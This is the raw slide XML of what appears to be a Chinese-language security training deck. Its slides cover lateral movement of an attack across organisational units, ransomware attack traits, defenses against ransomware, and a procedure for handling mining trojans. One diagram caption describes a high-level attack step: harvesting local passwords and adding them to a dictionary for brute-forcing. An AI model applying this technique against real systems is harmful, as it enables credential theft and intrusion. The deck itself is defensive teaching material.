            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="non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1800" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0033CC"/>
                  </a:solidFill>
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                  <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                </a:rPr>
                <a:t>A</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0033CC"/>
                  </a:solidFill>
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                  <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                </a:rPr>
                <a:t>市单位</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                    <a:srgbClr val="C0C0C0"/>
                  </a:outerShdw>
                </a:effectLst>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="50191" name="组合 112"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="2364582" y="3604025"/>
              <a:ext cx="1527572" cy="461665"/>
              <a:chOff x="3335926" y="2904568"/>
              <a:chExt cx="3231634" cy="616158"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="54" name="燕尾形 53">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4F628528-891F-0142-BA97-E304AE9D5985}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="3335926" y="2985610"/>
                <a:ext cx="365228"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5" name="燕尾形 54">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{97C28BB3-3269-6A49-A000-0B07EF7A8E76}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="3653296" y="2985610"/>
                <a:ext cx="365228"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6" name="燕尾形 55">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3D2D829C-63B9-AF41-9D33-EFAA7EE530AC}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="3973186" y="2985610"/>
                <a:ext cx="365227"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7" name="燕尾形 56">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3E62E630-0855-A842-AE7C-400B1811ED90}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4290556" y="2985610"/>
                <a:ext cx="365227"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8" name="燕尾形 57">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7004A912-C0E1-BB44-B481-EE081DA43F8F}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4610444" y="2985610"/>
                <a:ext cx="365228"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9" name="燕尾形 58">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3A55F5DF-D5D1-C045-94E8-E9EA33F1C2D9}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4927814" y="2985610"/>
                <a:ext cx="365228"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0" name="燕尾形 59">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{87DD5482-228A-4F43-9F14-94A423D93E91}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5247704" y="2985610"/>
                <a:ext cx="365227"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1" name="燕尾形 60">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0D953E7F-36A6-6A40-B4E2-D79A813D738F}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5565074" y="2985610"/>
                <a:ext cx="365227"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2" name="燕尾形 61">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D14FFDD6-A96F-3E4A-84F3-59B30F87CE49}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5884962" y="2985610"/>
                <a:ext cx="365228"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3" name="燕尾形 62">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B6329D34-DE6B-B844-B6EE-90DC95960A71}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6202332" y="2995144"/>
                <a:ext cx="365228"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4" name="矩形 63">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D9D139E5-1068-8F47-BEC7-3D3FBD39AB81}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4707225" y="2904568"/>
                <a:ext cx="390805" cy="616158"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="non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defRPr/>
                </a:pPr>
                <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400">
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                  <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="50192" name="文本框 64"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2272904" y="3048017"/>
              <a:ext cx="16644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zh-CN" altLang="en-US" sz="1400" b="1">
                  <a:solidFill>
                    <a:srgbClr val="0033CC"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>抓取本地密码后加入字典，实施爆破</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="66" name="图片 65">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F55E1A7B-A5C7-D145-939F-3A8BA7E1BDFB}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvPicPr>
              <a:picLocks noChangeAspect="1"/>
            </p:cNvPicPr>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId2"/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="1046742" y="4125435"/>
              <a:ext cx="349975" cy="403045"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln>
              <a:noFill/>
            </a:ln>
            <a:effectLst>
              <a:softEdge rad="112500"/>
            </a:effectLst>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="50194" name="文本框 66"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="717947" y="4520804"/>
              <a:ext cx="12144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1400" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0033CC"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>B</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0033CC"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>服务器</a:t>
              </a:r>
              <a:endParaRPr lang="is-IS" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:cxnSp>
          <p:nvCxnSpPr>
            <p:cNvPr id="68" name="肘形连接符 67">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6FE43201-3B61-0248-AF85-A0EA2285EC26}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvCxnSpPr>
              <a:stCxn id="50" idx="3"/>
              <a:endCxn id="66" idx="3"/>
            </p:cNvCxnSpPr>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="1396604" y="3527822"/>
              <a:ext cx="75009" cy="798909"/>
            </a:xfrm>
            <a:prstGeom prst="bentConnector3">
              <a:avLst>
                <a:gd name="adj1" fmla="val -227574"/>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直接箭头连接符 92">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C257C4AC-01BE-6F4D-8F04-854498536C19}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvCxnSpPr/>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1937147" y="3805238"/>
              <a:ext cx="427434"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矩形 69">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3ABC0AB4-47EC-FF4A-ACD7-003157028C73}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6263665" y="1500186"/>
              <a:ext cx="920445" cy="338554"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="non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r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0033CC"/>
                  </a:solidFill>
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                </a:rPr>
                <a:t>B</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0033CC"/>
                  </a:solidFill>
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                </a:rPr>
                <a:t>省单位</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="71" name="矩形 70">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{02675208-E536-6D46-A72E-1E215E6265C5}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7254921" y="3059907"/>
              <a:ext cx="819455" cy="307777"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="non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r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0033CC"/>
                  </a:solidFill>
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                </a:rPr>
                <a:t>C</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0033CC"/>
                  </a:solidFill>
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                </a:rPr>
                <a:t>市单位</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="72" name="矩形 71">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5AC4F9A4-A5E1-8D4D-B835-C6796484DD9E}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5840363" y="3568304"/>
              <a:ext cx="880370" cy="323165"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="non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r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1500" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0033CC"/>
                  </a:solidFill>
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                </a:rPr>
                <a:t>D</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1500" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0033CC"/>
                  </a:solidFill>
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                </a:rPr>
                <a:t>省单位</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="73" name="矩形 72">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{72FF09CD-7472-0F4E-9C42-182C0C5603C7}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6302209" y="4812507"/>
              <a:ext cx="904415" cy="338554"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="non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r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0033CC"/>
                  </a:solidFill>
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                </a:rPr>
                <a:t>E</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0033CC"/>
                  </a:solidFill>
                  <a:effectLst>
                    <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                      <a:srgbClr val="C0C0C0"/>
                    </a:outerShdw>
                  </a:effectLst>
                </a:rPr>
                <a:t>市单位</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27107257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A1ADBE-ADC3-9546-9320-240EFB1B9013}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568"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勒索病毒攻击特点</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51202" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1403648" y="1772816"/>
            <a:ext cx="5675163"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342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
              <a:defRPr kumimoji="1" sz="2400" b="1">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65"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无</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>C2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>服务器加密技术流行</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>攻击目标转向政企机构</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>针对关键信息基础设施的攻击</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>攻击目的开始多样化</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>勒索软件平台化运营</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>境外攻击者多于境内攻击者</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15888141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1202"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="51202"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="512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1A5B21-0299-604E-8C50-1ED351F7DB87}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755576"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勒索病毒事件防御</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53250" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1979713" y="2204864"/>
            <a:ext cx="489654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342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
              <a:defRPr kumimoji="1" sz="2400" b="1">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65"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文档自动备份隔离保护</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>综合性反勒索软件技术</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1370737" y="1781698"/>
            <a:ext cx="3057247" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>个人终端防御技术</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2012032" y="4317678"/>
            <a:ext cx="554461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342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
              <a:defRPr kumimoji="1" sz="2400" b="1">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65"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云端免疫技术</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>密码保护技术</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1368020" y="3794458"/>
            <a:ext cx="3416320" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>企业级终端防御技术</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28333336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3250"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="53250"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="532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up)">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>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P spid="5" grpId="0"/>
      <p:bldP spid="4"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EA6F1A-70DF-A441-AB83-32618A3531B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="395536"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挖矿木马处理流程</a:t>
            </a:r>
            <a:endParaRPr sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
